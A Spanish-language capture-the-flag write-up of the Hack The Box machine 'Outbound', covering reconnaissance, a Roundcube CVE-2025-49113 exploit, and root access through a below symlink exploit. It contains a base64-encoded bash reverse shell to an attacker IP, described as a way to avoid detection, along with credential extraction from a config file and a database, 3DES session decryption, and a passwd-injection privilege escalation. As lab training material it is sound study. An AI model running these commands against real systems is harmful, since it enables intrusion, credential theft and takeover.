
# Outbound

<figure><img src="/files/gNUWr2bkjM09ydp2poC8" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Outbound`
* **IP:** `10.10.11.77`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `18/08/2025`

### Pista inicial

Hack the Box nos proporciona credenciales del usuario tyler:

```
tyler / LhKL1o9Nm3X2
```

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.10.11.77 outbound.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

```bash
sudo nmap -v -sV -T5 10.10.11.77
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

### Acceso Web

Accedemos a `http://outbound.htb` y observamos que la url cambia a `mail.outbound.htb`, por lo que lo añadiremos al /etc/hosts. Al acceder encontramos un panel de login de `Roundcube Webmail`:

<figure><img src="/files/eLyFq1hgfxeKj1z8UEiQ" alt=""><figcaption></figcaption></figure>

Antes de acceder vamos a enumerar más el objetivo.

```bash
whatweb -a3 -v http://outbound.htb

WhatWeb report for http://outbound.htb
Status    : 302 Found
Title     : 302 Found
IP        : 10.10.11.77
Country   : RESERVED, ZZ

Summary   : HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], nginx[1.24.0], RedirectLocation[http://mail.outbound.htb/]

Detected Plugins:
<-----SNIP----->
[ nginx ]
	Nginx (Engine-X) is a free, open-source, high-performance 
	HTTP server and reverse proxy, as well as an IMAP/POP3 
	proxy server. 

	Version      : 1.24.0
	Website     : http://nginx.net/

HTTP Headers:
	HTTP/1.1 200 OK
	Server: nginx/1.24.0 (Ubuntu)
	Date: Thu, 17 Jul 2025 21:03:08 GMT
	Content-Type: text/html; charset=UTF-8
	Transfer-Encoding: chunked
	Connection: close
	Set-Cookie: roundcube_sessid=ll9f79sl4slj56sbpnbclmr9jm; path=/; HttpOnly
	Expires: Thu, 17 Jul 2025 21:03:08 GMT
	Last-Modified: Thu, 17 Jul 2025 21:03:08 GMT
	Cache-Control: private, no-cache, no-store, must-revalidate, post-check=0, pre-check=0
	Pragma: no-cache
	X-Frame-Options: sameorigin
	Content-Language: en
	Content-Encoding: gzip
```

Con Whatweb encontramos una cookie interesante:

```
Set-Cookie: roundcube_sessid=ll9f79sl4slj56sbpnbclmr9jm
```

En el código fuente encontramos una posible versión `"rcversion":10610`. Esto corresponde a **Roundcube 1.6.10**, según el formato interno (`1.6.10 => 10610`).

<figure><img src="/files/Dz0GD16uf0fS5VKl4yzh" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Escaneo de vulnerabilidades</mark>

Con Nuclei vemos que es vulnerable al `CVE-2025-49113`, que nos permite RCE en el objetivo si estamos autenticados, y confirmamos la versión que encontramos en el código fuente de manera explícita:

```bash
nuclei -u http://mail.outbound.htb/

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.10

		projectdiscovery.io
		
[INF] Templates loaded for current scan: 8214
[INF] Executing 8014 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 200 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1775 (Reduced 1668 Requests)
[INF] Using Interactsh Server: oast.pro
[CVE-2025-49113:version_check] [http] [critical] http://mail.outbound.htb/ ["Roundcube Version: 1.6.10"]
[roundcube-log-disclosure] [http] [medium] http://mail.outbound.htb/roundcube/logs/errors.log ["3652"] [roundcube_path="roundcube/logs/errors.log"]
[cookies-without-secure] [javascript] [info] mail.outbound.htb ["roundcube_sessid"]
[waf-detect:nginxgeneric] [http] [info] http://mail.outbound.htb/
[openssh-detect] [tcp] [info] mail.outbound.htb:22 ["SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.12"]
[ssh-auth-methods] [javascript] [info] mail.outbound.htb:22 ["["publickey","password"]"]
[ssh-password-auth] [javascript] [info] mail.outbound.htb:22
[ssh-server-enumeration] [javascript] [info] mail.outbound.htb:22 ["SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.12"]
[ssh-sha1-hmac-algo] [javascript] [info] mail.outbound.htb:22
[roundcube-webmail-portal] [http] [info] http://mail.outbound.htb/
[http-missing-security-headers:strict-transport-security] [http] [info] http://mail.outbound.htb/
[http-missing-security-headers:content-security-policy] [http] [info] http://mail.outbound.htb/
[http-missing-security-headers:permissions-policy] [http] [info] http://mail.outbound.htb/
[http-missing-security-headers:x-content-type-options] [http] [info] http://mail.outbound.htb/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://mail.outbound.htb/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://mail.outbound.htb/
[http-missing-security-headers:referrer-policy] [http] [info] http://mail.outbound.htb/
[http-missing-security-headers:clear-site-data] [http] [info] http://mail.outbound.htb/
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://mail.outbound.htb/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://mail.outbound.htb/
[nginx-version] [http] [info] http://mail.outbound.htb/ ["nginx/1.24.0"]
[tech-detect:bootstrap] [http] [info] http://mail.outbound.htb/
[tech-detect:nginx] [http] [info] http://mail.outbound.htb/
[caa-fingerprint] [dns] [info] mail.outbound.htb
```

***

## <mark style="color:purple;">Búsqueda de exploits</mark>

### Investigación de CVEs / Exploits

Exploramos CVEs relacionados con `Roundcube Webmail` en fuentes como:

* <https://sploitus.com>
* <https://exploit-db.com>
* <https://github.com>

Encontramos un `CVE-2025-49113` que nos permite RCE en el objetivo si estamos autenticados:

{% embed url="<https://github.com/hakaioffsec/CVE-2025-49113-exploit>" %}

***

## <mark style="color:purple;">Acceso Inicial</mark>

Vamos a ejecutar el PoC de la siguiente manera;

```bash
php CVE-2025-49113.php <url> <username> <password> <command>
```

Por lo que para conseguir una reverse shell le indicamos lo siguiente. Primero codificaremos una reverse shell en base64 (lo que impide la detección):

```bash
bash -i >& /dev/tcp/10.10.14.253/4444 0>&1
```

```bash
echo "bash -i >& /dev/tcp/10.10.14.253/4444 0>&1" | base64

YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNTMvNDQ0NCAwPiYxCg==
```

Abrimos un listener de netcat por el puerto 4444 y ejecutamos el exploit:

```bash
php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 'printf YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNTMvNDQ0NCAwPiYxCg | base64 -d | bash'

[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
```

Al instante recibimos una reverse shell! Estamos dentro:

```bash
nc -lvnp 4444
                
listening on [any] 4444 ...
connect to [10.10.14.253] from (UNKNOWN) [10.10.11.77] 53818
bash: cannot set terminal process group (248): Inappropriate ioctl for device
bash: no job control in this shell

www-data@mail:/$ whoami
www-data

www-data@mail:/$ cd /home
www-data@mail:/home$ ls
jacob
mel
tyler

www-data@mail:/home$ cd tyler
bash: cd: tyler: Permission denied
```

Somos el usuario www-data y no tenemos permiso para acceder a la home de los usuarios, por lo que cambiaremos al usuario tyler utilizando su contraseña:

```bash
www-data@mail:/$ su tyler 
Password: LhKL1o9Nm3X2

whoami
tyler
```

Tenemos una shell limitada, por lo que haremos un tratamiento de la TTY:

```bash
script /dev/null -c bash

Script started, output log file is '/dev/null'.

tyler@mail:/$ 
```

Dentro de la home de tyler solo hay una carpeta mail sin nada relevante. Tampoco tenemos permisos de ejecución:

```bash
tyler@mail:/var/www/html/roundcube$ sudo -l 

bash: sudo: command not found
```

***

## <mark style="color:purple;">Enumeración interna</mark>

Siempre que corre una aplicación web y tenemos acceso por terminal, es buena idea ver el directorio /var/www/html, ya que puede contener credenciales de usuarios:

```shell-session
tyler@mail:/var/www/html/roundcube$ ls

CHANGELOG.md  SECURITY.md  composer.json  logs         skins
INSTALL       SQL          composer.lock  plugins      temp
LICENSE       UPGRADING    config         program      vendor
README.md     bin          index.php      public_html
```

En el directorio config encontramos un archivo de configuración que contiene credenciales de acceso a mysql:

```
mysql://roundcube:RCDBPass2025@localhost/roundcube
```

```bash
tyler@mail:/var/www/html/roundcube/config$ cat config.inc.php

<?php

/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';

// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config['support_url'] = '';

// Name your service. This is displayed on the login screen and in the window title
$config['product_name'] = 'Roundcube Webmail';

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

// List of active plugins (in plugins/ directory)
$config['plugins'] = [
    'archive',
    'zipdownload',
];

// skin name: folder from skins/
$config['skin'] = 'elastic';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';
```

### Enumeración de la base de datos

Primero enumeramos la tabla users, ya que suele contener contraseñas de los usuarios

```shell-session
tyler@mail:/$ mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from users;'   

+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                       |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
|       1 | jacob    | localhost | 2025-06-07 13:55:18 | 2025-06-11 07:52:49 | 2025-07-17 21:57:22 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";} |
|       2 | mel      | localhost | 2025-06-08 12:04:51 | 2025-06-08 13:29:05 | NULL                |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";} |
|       3 | tyler    | localhost | 2025-06-08 13:28:55 | 2025-07-17 22:42:36 | 2025-06-11 07:51:22 |                    1 | es_ES    | a:1:{s:11:"client_hash";s:16:"Y2Rz3HTwxwLJHevI";} |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
```

Encontramos los hashes en un formato bastante extraño, por lo que seguiremos enumerando el objetivo. Dentro de la tabla sessions encontramos cadenas de texto bastante largas, que podemos intuir que están codificadas en base64:

```shell-session
tyler@mail:/$ mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from session;' -E

*************************** 1. row ***************************
sess_id: 6a5ktqih5uca6lj8vrmgh9v0oh
changed: 2025-06-08 15:46:40
     ip: 172.17.0.1
   vars: bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7
*************************** 2. row ***************************
sess_id: aqhsdnufd4s9o3b5b17k93f086
changed: 2025-07-17 22:46:31
     ip: 172.17.0.1
   vars: bGFuZ3VhZ2V8czo1OiJlbl9HQiI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjM7dXNlcm5hbWV8czo1OiJ0eWxlciI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ik1paUYxckNJbXJqNHlpQUxjUTZJTFhuS1YzVmR5Zk5PIjtsb2dpbl90aW1lfGk6MTc1Mjc5MjM3MDt0aW1lem9uZXxzOjE5OiJBZnJpY2EvSm9oYW5uZXNidXJnIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJWYWl6QlcyWlZZaUVmQ0E4Yjl0b25peHhSRiI7cmVxdWVzdF90b2tlbnxzOjMyOiJ6UllEV1V0TklVWDRRUnR0QnhMdGVLeWRJUlRPVm15YSI7dGFza3xzOjExOiJhZGRyZXNzYm9vayI7c2tpbl9jb25maWd8YTo3OntzOjE3OiJzdXBwb3J0ZWRfbGF5b3V0cyI7YToxOntpOjA7czoxMDoid2lkZXNjcmVlbiI7fXM6MjI6ImpxdWVyeV91aV9jb2xvcnNfdGhlbWUiO3M6OToiYm9vdHN0cmFwIjtzOjE4OiJlbWJlZF9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE5OiJlZGl0b3JfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxNzoiZGFya19tb2RlX3N1cHBvcnQiO2I6MTtzOjI2OiJtZWRpYV9icm93c2VyX2Nzc19sb2NhdGlvbiI7czo0OiJub25lIjtzOjIxOiJhZGRpdGlvbmFsX2xvZ29fdHlwZXMiO2E6Mzp7aTowO3M6NDoiZGFyayI7aToxO3M6NToic21hbGwiO2k6MjtzOjEwOiJzbWFsbC1kYXJrIjt9fWltYXBfaG9zdHxzOjk6ImxvY2FsaG9zdCI7bWJveHxzOjU6IklOQk9YIjtzb3J0X2NvbHxzOjA6IiI7c29ydF9vcmRlcnxzOjQ6IkRFU0MiO1NUT1JBR0VfVEhSRUFEfGE6Mzp7aTowO3M6MTA6IlJFRkVSRU5DRVMiO2k6MTtzOjQ6IlJFRlMiO2k6MjtzOjE0OiJPUkRFUkVEU1VCSkVDVCI7fVNUT1JBR0VfUVVPVEF8YjowO1NUT1JBR0VfTElTVC1FWFRFTkRFRHxiOjE7bGlzdF9hdHRyaWJ8YTo3OntzOjQ6Im5hbWUiO3M6ODoibWVzc2FnZXMiO3M6MjoiaWQiO3M6MTE6Im1lc3NhZ2VsaXN0IjtzOjU6ImNsYXNzIjtzOjQyOiJsaXN0aW5nIG1lc3NhZ2VsaXN0IHNvcnRoZWFkZXIgZml4ZWRoZWFkZXIiO3M6MTU6ImFyaWEtbGFiZWxsZWRieSI7czoyMjoiYXJpYS1sYWJlbC1tZXNzYWdlbGlzdCI7czo5OiJkYXRhLWxpc3QiO3M6MTI6Im1lc3NhZ2VfbGlzdCI7czoxNDoiZGF0YS1sYWJlbC1tc2ciO3M6MTg6IlRoZSBsaXN0IGlzIGVtcHR5LiI7czo3OiJjb2x1bW5zIjthOjg6e2k6MDtzOjc6InRocmVhZHMiO2k6MTtzOjc6InN1YmplY3QiO2k6MjtzOjY6InN0YXR1cyI7aTozO3M6NjoiZnJvbXRvIjtpOjQ7czo0OiJkYXRlIjtpOjU7czo0OiJzaXplIjtpOjY7czo0OiJmbGFnIjtpOjc7czoxMDoiYXR0YWNobWVudCI7fX1mb2xkZXJzfGE6Mjp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aTowO3M6NjoibWF4dWlkIjtpOjA7fXM6NDoiU2VudCI7YToyOntzOjM6ImNudCI7aTowO3M6NjoibWF4dWlkIjtpOjA7fX11bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjA7czo0OiJTZW50IjtpOjA7fWFkZHJlc3Nib29rc19jb3VudHxpOjM7YWRkcmVzc2Jvb2tzX2NvdW50X3dyaXRlYWJsZXxpOjE7Y29udGFjdGNvdW50ZGlzcGxheXxzOjExOiJmcm9tdG9zaG9ydCI7cGFnZXxpOjE7
*************************** 3. row ***************************
sess_id: jd6gslc2ssebv217upadrfhdud
changed: 2025-07-17 22:46:11
     ip: 172.17.0.1
   vars: dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJoT0RGVlUycHNuZHdrNVY5T1BTWmZMNVkxV1dGUzRzWiI7
```

Al decodificarlo con CyberChef encontramos las credenciales del usuario jacob y su auth\_secret:

<figure><img src="/files/34uyZmga71JBAkRfPatz" alt=""><figcaption></figcaption></figure>

```
jacob / L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
```

Estas credenciales no sirven para acceder directamente, no es la contraseña en plano del usuario. En el archivo `config.inc.php` que vimos antes, encontramos un `des_key`, que junto al `auth_secret` que hemos descubierto intuímos que usa un cifrado `Triple DES`:

{% code title="des\_key" %}

```bash
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

{% endcode %}

{% code title="auth\_secret" %}

```
DpYqv6maI9HxDL5GhcCd8JaQQW
```

{% endcode %}

### Descifrado 3DES

Podemos echarle un ojo al siguiente artículo para descifrar las claves de las variables de sesión

{% embed url="<https://www.roundcubeforum.net/index.php?topic=23399.0>" %}

Primero se descifra en `base64` y luego se convierte a hexadecimal, los primeros ocho bytes se utilizan como texto cifrado `IV` y el resto se utilizan como texto cifrado.

<figure><img src="/files/e4g2XZAmdBtD8rnQUppF" alt=""><figcaption></figcaption></figure>

```
2f b4 6f d3 40 3c 4e ec 09 02 be bb 90 84 f1 c5 c4 a0 9c 89 36 e4 09 bf
<- Texto cifrado IV --> <------------- Input cifrado ----------------->
```

<figure><img src="/files/rHcYmeDMJid45mjUOqML" alt=""><figcaption></figcaption></figure>

Ahora si, conseguimos la contraseña en plano para el usuario jacob:

```
jacob / 595mO8DmwGeD
```

```shell-session
tyler@mail:/$ su jacob
Password: 595mO8DmwGeD

jacob@mail:/$ whoami
jacob
```

Al acceder al directorio home de jacob encontramos un directorio mail, que contiene un email con credenciales:

```shell-session
jacob@mail:~/mail/INBOX$ cat jacob

From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
	id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002
X-UID: 1
Status: 
X-Keywords:                                                                       
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler

From mel@outbound.htb  Sun Jun 08 12:09:45 2025
Return-Path: <mel@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
	id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250608120945.1487E22C@outbound.htb>
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 2
Status: 
X-Keywords:                                                                       
Content-Length: 261

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel
```

Probamos a acceder por SSH y entramos sin problema:

```shell-session
afsh4ck@kali$ ssh jacob@mail.outbound.htb
          
The authenticity of host 'mail.outbound.htb (10.10.11.77)' can't be established.
ED25519 key fingerprint is SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'mail.outbound.htb' (ED25519) to the list of known hosts.
jacob@mail.outbound.htb's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)

Last login: Thu Jul 10 11:44:49 2025 from 10.10.14.77
jacob@outbound:~$ 
```

***

## <mark style="color:purple;">User Flag</mark>

```bash
jacob@outbound:~$ cat user.txt
e510fc93f2b1ceb7503ce6f2********
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

Tenemos permisos para ejecutar below en la máquina:

```shell-session
jacob@outbound:~$ sudo -l

Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below
        -d*
```

Podemos echarle un ojo al menú de ayuda para comprender cómo funciona:

```shell-session
jacob@outbound:~$ sudo /usr/bin/below -h

Usage: below [OPTIONS] [COMMAND]

Commands:
  live      Display live system data (interactive) (default)
  record    Record local system data (daemon mode)
  replay    Replay historical data (interactive)
  debug     Debugging facilities (for development use)
  dump      Dump historical data into parseable text format
  snapshot  Create a historical snapshot file for a given time range
  help      Print this message or the help of the given subcommand(s)

Options:
      --config <CONFIG>  [default: /etc/below/below.conf]
  -d, --debug            
  -h, --help             Print help
```

Después de una búsqueda de exploits, el punto de prueba real es: `CVE-2025-27591`:

{% embed url="<https://github.com/BridgerAlderson/CVE-2025-27591-PoC>" %}

Nos descargamos el repositorio y enviamos el exploit a la máquina objetivo:

```bash
git clone https://github.com/BridgerAlderson/CVE-2025-27591-PoC.git
cd CVE-2025-27591-PoC
python3 -m http.server 80
```

Y en la máquina objetivo lo descargamos y ejecutamos:

```shell-session
jacob@outbound:~$ wget http://10.10.14.122/exploit.py

jacob@outbound:~$ python3 exploit.py
[*] Checking for CVE-2025-27591 vulnerability...
[+] /var/log/below is world-writable.
[!] /var/log/below/error_root.log is a regular file. Removing it...
[+] Symlink created: /var/log/below/error_root.log -> /etc/passwd
[+] Target is vulnerable.
[*] Starting exploitation...
[+] Wrote malicious passwd line to /tmp/attacker
[+] Symlink set: /var/log/below/error_root.log -> /etc/passwd
[*] Executing 'below record' as root to trigger logging...
Aug 19 12:48:42.919 DEBG Starting up!
Aug 19 12:48:42.920 ERRO 
----------------- Detected unclean exit ---------------------
Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01755561600: EAGAIN: Try again
-------------------------------------------------------------
[+] 'below record' executed.
[*] Appending payload into /etc/passwd via symlink...
[+] Payload appended successfully.
[*] Attempting to switch to root shell via 'su attacker'...

root@outbound:/home/jacob# whoami
root
```

<figure><img src="/files/DOrwDp5vt6Isy4uQAkxX" alt=""><figcaption></figcaption></figure>

Bingo! Ya somos root

***

## 👑 <mark style="color:purple;">Root Flag</mark>

```shell-session
root@outbound:~# ls
root.txt

root@outbound:~# cat root.txt
57af1163dbaff87f73ddeef**********
```
